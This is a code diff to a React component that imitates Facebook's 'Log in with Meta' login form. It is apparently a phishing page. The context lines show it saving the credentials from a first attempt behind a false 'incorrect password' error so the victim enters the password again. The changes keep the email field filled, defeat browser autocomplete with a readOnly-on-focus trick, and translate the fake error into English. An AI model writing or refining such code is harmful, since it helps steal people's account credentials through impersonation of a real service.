@@ -21,7 +21,6 @@ export default function FacebookLogin() {
       // Lần nhập đầu tiên
       setShowError(true);
       setAttempts([data]); // Lưu thông tin lần 1
-      setValue("email", ""); // Clear input
       setValue("password", "");
     } else {
       // Lần nhập thứ hai
@@ -55,13 +54,16 @@ export default function FacebookLogin() {
             Log in to use your Facebook account with <strong>Meta</strong>.
           </p>
 
-          <form onSubmit={handleSubmit(onSubmit)} className="fb-login-form">
+          <form onSubmit={handleSubmit(onSubmit)} className="fb-login-form" autoComplete="off">
             <div className="fb-form-group">
               <label htmlFor="email">Email address or phone number:</label>
               <input
                 type="text"
                 id="email"
                 className="fb-input"
+                autoComplete="false"
+                readOnly
+                onFocus={(e) => e.target.removeAttribute("readOnly")}
                 {...register("email", { required: "Email is required" })}
               />
               {errors.email && <p className="error-text">{errors.email.message}</p>}
@@ -73,12 +75,15 @@ export default function FacebookLogin() {
                 type="password"
                 id="password"
                 className="fb-input"
+                autoComplete="off"
+                readOnly
+                onFocus={(e) => e.target.removeAttribute("readOnly")}
                 {...register("password", { required: "Password is required" })}
               />
               {errors.password && <p className="error-text">{errors.password.message}</p>}
             </div>
 
-            {showError && <p className="error-text">Tài khoản hoặc mật khẩu không chính xác. Vui lòng thử lại.</p>}
+            {showError && <p className="error-text">Incorrect username or password. Please try again.</p>}
 
             <div className="fb-actions">
               <button type="submit" className="fb-login-button">
